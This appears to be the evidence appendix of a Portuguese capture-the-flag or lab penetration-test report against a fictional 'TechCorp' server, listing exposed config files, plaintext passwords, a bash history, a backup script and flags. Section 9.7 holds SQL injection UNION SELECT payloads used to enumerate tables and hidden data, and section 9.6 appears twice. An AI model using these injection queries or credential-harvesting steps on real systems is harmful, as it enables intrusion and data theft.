# 09 - Evidências Técnicas

---

## 9.1 Código-Fonte Exposto: database.php

**Local:** `/config/database.php.txt`

```php
<?php
$db_host = 'db';
$db_user = 'techcorp_user';
$db_pass = 'T3chC0rp_S3cr3t_2024!';
$db_name = 'techcorp_db';

$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// FLAG{d4t4b4s3_cr3d3nt14ls_3xp0s3d}
```
---

## 9.2 Arquivo de Senhas: passwords.txt

**Local:** `/confidential/passwords.txt`

SSH Server Credentials:
- User: techcorp
- Password: TechCorp2024!

FTP Admin:
- User: ftpadmin
- Password: ftp@dm1n123

Database Backup User:
- User: backup_user
- Password: B4ckup_S3cr3t_2024

FLAG{p4ssw0rd_f1l3_d1sc0v3ry}


### 9.3 Configuração FTP: `users.conf`

**Local:** `/srv/users.conf`

```t
anonymous:password123
ftpadmin:ftp@dm1n123
techcorp:TechCorp2024!
guest:guest123

FLAG{c0nf1g_f1l3_r34d}
```

### 9.4 Arquivo Secret: `secret.txt`

**Local:** `/home/techcorp/secret.txt`

```t
Senhas importantes:
- Root MySQL: r00t_P4ssw0rd_2024
- Admin Panel: admin / admin123

FLAG{ssh_h0m3_d1r3ct0ry_3xpl0r4t10n}
```
### 9.5 Histórico Bash

**Local:** `/home/techcorp/.bash_history`

```bash
mysql -u root -p # senha r00t_P4ssw0rd_2024
cd /home/techcorp/
cat secret.txt
echo "FLAG{b4sh_h1st0ry_l34k}" > /tmp/flag.txt
```
### 9.6 Script de Backup

**Local:** `/opt/backup_script.sh`

```bash
#!/bin/bash
BACKUP_DIR="/var/backups/techcorp"
DATE=$(date +%Y%m%d)
DB_USER="root"
DB_PASS="r00t_P4ssw0rd_2024"

mysqldump -u $DB_USER -p$DB_PASS techcorp_db > $BACKUP_DIR/db_backup_$DATE.sql
tar -czf $BACKUP_DIR/web_backup_$DATE.tar.gz /var/www/html

echo "FLAG{b4ckup_scr1pt_f0und}" >> /tmp/backup.log
# FLAG{scr1pt_4n4lys1s_sk1ll}
```

### 9.6 Script de Backup  
**Local:** `/opt/backup_script.sh`

```bash
#!/bin/bash
BACKUP_DIR="/var/backups/techcorp"
DATE=$(date +%Y%m%d)
DB_USER="root"
DB_PASS="r00t_P4ssw0rd_2024"

mysqldump -u $DB_USER -p$DB_PASS techcorp_db > $BACKUP_DIR/db_backup_$DATE.sql
tar -czf $BACKUP_DIR/web_backup_$DATE.tar.gz /var/www/html

echo "FLAG{b4ckup_scr1pt_f0und}" >> /tmp/backup.log
# FLAG{scr1pt_4n4lys1s_sk1ll}


### 9.7 Consultas SQL por SQL Injection

**Consultas utilizadas:**

```sql
UNION SELECT table_name, 1,1 FROM information_schema.tables;
UNION SELECT secret_data,1,1 FROM secret_data;
UNION SELECT table_name,1,1 FROM information_schema.views;

# FLAG{h1dd3n_d4t4_t4bl3_f0und}

# FLAG{v13w_d1sc0v3ry_4dv4nc3d}


